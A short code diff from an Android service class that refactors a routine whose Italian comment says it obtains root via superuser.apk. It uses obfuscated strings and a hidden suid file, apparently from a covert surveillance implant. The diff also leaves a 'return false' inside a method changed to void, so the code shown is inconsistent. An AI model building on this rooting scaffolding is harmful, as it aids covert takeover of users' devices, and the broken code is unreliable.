@@ -134,10 +134,10 @@ public class ServiceCore extends Service {
 			// Ask the user...
 			superapkRoot();
 
-			boolean isRoot = PackageInfo.checkRoot();
+			Status.self().setSu(PackageInfo.checkRoot());
 			
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onStart): isRoot = " + isRoot); //$NON-NLS-1$
+				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
 			}
 		}
 		
@@ -425,14 +425,13 @@ public class ServiceCore extends Service {
 	}
 
 	// Prendi la root tramite superuser.apk
-	private boolean superapkRoot() {
+	private void superapkRoot() {
 		final File filesPath = getApplicationContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String suidext = Messages.getString("32.6"); // statusdb
-		boolean isRoot = PackageInfo.checkRoot();
 
 		if (Status.self().haveSu() == false) {
-			return false;
+			return;
 		}
 		
 		Resources resources = getResources();
@@ -469,8 +468,6 @@ public class ServiceCore extends Service {
 
 			return false;
 		}
-
-		return isRoot;
 	}
 
 	private boolean root() {
